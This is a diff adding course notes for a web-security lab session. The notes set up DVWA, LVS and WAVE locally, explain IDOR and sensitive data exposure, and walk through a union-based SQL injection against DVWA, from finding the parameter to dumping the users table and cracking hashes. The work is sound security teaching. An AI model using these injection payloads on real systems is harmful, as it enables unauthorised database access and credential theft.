@@ -1,0 +1,221 @@
+						Session 10 
+
+		Setting up of LVS , WAVE and DVWA...
+For LVS
+=======
+Step 1 --> Extract the contents of LVS_1 in a folder
+Step 2 --> Copy that extracted forlder in C:\xampp\htdocs
+Step 3 --> STart XAMPP server --> Apache and MySQL
+Step 4 --> in the browser type --> 127.0.0.1/lvs_1
+        lvs_1 --> Name of Extracted Folder
+Download Link --> https://ufile.io/aci9l
+ 
+ 
+For WAVE
+========
+Step 1 --> Extract the contents of wave in a folder
+Step 2 --> Copy that extracted forlder in C:\xampp\htdocs
+Step 3 --> STart XAMPP server --> Apache and MySQL
+Step 4 --> in the browser type --> 127.0.0.1/wave1
+        wave1 --> Name of Extracted Folder
+Download Link --> https://ufile.io/bk3w5
+ 
+For DVWA
+========
+Step 1 --> Extract the contents of DVWA in a folder
+Step 2 --> Copy that extracted forlder in C:\xampp\htdocs
+Step 3 --> STart XAMPP server --> Apache and MySQL
+Step 4 --> Open configurtion file of dvwa and delete the password 				field value. c:/xammp/dvwa/config/config.php
+Step 5 --> in the browser type --> 127.0.0.1/DVWA
+Step 6 --> login with the credentials --> admin
+										  password
+
+Downloading Link --> https://ufile.io/a5lg8
+
+
+============x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x==========
+
+METHODS USED IN WEB APPLICATIONS
+================================
+1. GET - It is the method used by web applications.In this type of request all the request made is sent in plain text i.e. the request is visible at the address bar.It is very insecure method as if one person is shoulder surfing he will be able to grasp your credential and this method is also helpful for several attacks.
+eg: www.aaab.com/haha.php?id=1
+    www.adsadsa.com/index.php?happyness=null
+
+
+2. POST - The method which hides and requests the data from the Database or Server Secretly. eg. twitter.com/login.php
+
+Demo...
+
+----------------------------------------------------------
+
+INSECURE DIRECT OBJECT REFERENCE
+================================
+A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key. Without an access control check or other protection, attackers can manipulate these references to access unauthorized data.
+Do note here that a malicious is able to access resources of another USER only. Both have the same level of access in case of IDOR.
+
+example :
+
+			www.hungama.com/user.php?id=1
+			www.hungama.com/user.php?id=4
+			www.hungama.com/user.php?id=2
+	Without proper validation it jumps you to another account.
+
+Wave1
+
+----------------------------------------------------------
+
+SENSITIVE DATA EXPOSURE
+=======================
+Many web applications do not properly protect sensitive data such as Names, IDs, Credit Cards details, authentication credentials etc. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft or any other crimes. These Sensitive Data is well aspected to encryption also in which if the data is not encrypted and is in plain text, it will be very easier to get fetched by the attacker or any other individual. 
+
+Types of Sensitive Data
+=======================
+
+1. Personal - Names, Address , Contact Numbers etc.
+2. Confidential - ID,Passwords - Credentials, Aadhar No.
+3. Financial - Bank Accounts numbers, credit cards, debit cards etc.
+
+
+
+			HOW A SENSITIVE DATA CAN BE COMPROMISED
+			--------=========================--------
+
+1. When data is transmitted in the url, that is your credentials are transmitted via GET Parameter.
+	username=user&password=pass&sumbit=submit
+2. When data is stored in plain text form rather then hashed or encrypted form.
+3. When data is stored in the text file rather then to be stored in the databsae.
+	
+	 Id 	Interest 	Gender 	Username 	Password
+	 ----------------------------------------------- 	
+	1 	    Badminton 	Female 	admin 		Pa$$woRd
+	2  		Football 	Male 	admin2 		paSSwOrd
+
+-----------------------------------------------------------------
+LVS
+
+SQL Injections
+==============
+	Where an attacker passes the malicious SQL commands just to gain the juicy information from the database.
+	SQLi
+
+UNION BASED SQL INJECTION
+=========================
+	Where an attacker uses the union command to collect the information and merge it into one table. He passes malicious commands and queries in the database to do so.
+
+DEMO
+====
+DVWA ---> Security:Low 
+			SQL Injection
+Step 1
+======
+To find 'GET' parameter.
+	something=something
+		php?id=something
+		php?id=cat
+		php?id=1
+		php?id=query
+
+	Either you click on some link of the web application|site or enter something in the search box.
+
+	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1&Submit=Submit#
+
+Step 2
+======
+To generate a SQL error, to break the query.
+	1
+	1'
+
+	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1'&Submit=Submit#
+
+	You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
+
+	'select * from table '
+	'select * from table' '
+
+Step 3
+======
+To count the number of columns, in the web application.
+	For counting the number of columns, we will use order by
+
+	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' order by 1--+&Submit=Submit#
+		Shows us data
+		This query means that we are asking the database to arrange the data according to column number 1
+
+	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' order by 2--+&Submit=Submit#
+		Shows me data
+		This query means that we are asking the database to arrange the data according to column number 2
+
+	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' order by 3--+&Submit=Submit#
+		Gives us an error
+			Unknown column '3' in 'order clause'
+		This query means that I am asking the database to arrange the data according to column number 3
+		But there is no column number 3 --> so it will generate an error
+
+order by n--+
+	n starts from 1 and ends when i receive an error for the value of n
+	--+ ---> To comment out
+			if there is any data passed down after --+, it will not execute at all. we can also use # to comment out the rest content.
+
+	There are 2 columns, in the database.
+
+Step 4
+======
+To merge the data of all the columns, using UNION command.
+	union select 1,2,...,n-1--+
+	n=3
+	union select 1,2--+
+
+
+http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' union select 1,2--+&Submit=Submit#
+
+		ID: 1' union select 1,2-- 
+		First name: admin
+		Surname: admin
+
+		ID: 1' union select 1,2-- 
+		First name: 1
+		Surname: 2
+
+http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' union select database(),version()--+&Submit=Submit#
+	
+	database() --> database name
+	version()  --> Database Version Number
+
+Step 5
+======
+To call database ki ma --> information_schema, for getting the information about the table names
+	Information_schema --> it is meta table --> it contains the name of tables and columns which are present in the database.
+		information_schema.tables
+					|-> It stores the name of all the table names in the database.
+
+	union select table_name,2 from information_schema.tables--+
+					or
+	union select 1,table_name from information_schema.tables--+
+
+
+	We can apply both of them because both the fields are vulnerable otherwise we will go for the one which is vulnerable.
+
+	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' union select 1,table_name from information_schema.tables--+&Submit=Submit#
+
+Step 6
+======
+I will again call database ki maa for columns names in the table names as users
+	information_schema
+	information_schema.columns
+
+	union select 1,column_name from information_schema.columns where table_name="users"--+
+
+
+Step 7
+======
+To retreive or dump data from the above info.
+	DVWA --> Users --> (User_id,first_name,Last_name,user,Password)
+
+	union select 1,group_concat(User_id,0x0a,first_name,0x0a,Last_name,0x0a,user,0x0a,Password,0x3a) from users--+
+
+
+
+Password is in hashed form so we will go online and check if the hash value of the value is availble or not.
+
+
+
